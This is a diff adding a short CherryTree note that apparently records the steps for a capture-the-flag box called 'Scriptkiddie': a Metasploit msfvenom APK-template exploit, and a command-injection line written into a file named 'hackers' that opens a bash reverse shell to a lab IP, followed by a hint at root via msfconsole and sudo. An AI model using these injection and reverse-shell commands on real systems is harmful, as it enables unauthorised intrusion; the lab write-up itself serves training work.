@@ -1,0 +1,24 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Scriptkiddie" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1615330024.04" ts_lastsave="1615330236.26" unique_id="1">
+		<rich_text>port 5000 has webserver
+
+use metasploit exploit to generate an apk template (</rich_text>
+		<rich_text link="webs https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/">https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/</rich_text>
+		<rich_text>)
+
+upload template to server (msfvenom + android)
+
+get reverse shell for user
+
+empty file (hackers) owned by user kid (me) and group 'pwn' 
+run:  </rich_text>
+		<rich_text foreground="#ffffffff0000">echo &quot;  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.132/4446 0&gt;&amp;1' #&quot; &gt;&gt; hackers</rich_text>
+		<rich_text> to get rev shell
+        (for some reason space is needed after &quot; )
+        
+ sudo -l to see t hat we can run msfconsole as root
+
+</rich_text>
+	</node>
+</cherrytree>
